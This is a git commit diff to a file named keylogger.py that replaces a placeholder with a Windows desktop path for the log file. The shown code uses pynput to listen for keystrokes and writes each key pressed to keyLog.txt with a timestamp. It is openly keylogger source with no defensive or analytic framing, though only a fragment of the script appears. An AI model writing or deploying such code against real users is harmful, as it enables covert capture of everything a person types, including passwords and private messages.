57c0d3670c4a16cf5cb4abb475929250b69164c2
shashwath63 <shashwathbn10@gmail.com>
2023-09-21 18:32:14 +0530

    path added

--- keylogger.py
+++ keylogger.py
@@ -1,7 +1,7 @@
 import pynput
 from pynput.keyboard import Key,Listener
 import logging
-log_dir=r"Path_for_keylogfile"
+log_dir=r"c:\users\admin\desktop\keylogger" #path where the keylog.txt file is stored 
 logging.basicConfig(filename=(log_dir+r"\keyLog.txt"),level=logging.DEBUG,format='%(asctime)s:%(message)s')
 def on_press(key):
     logging.info(str(key))
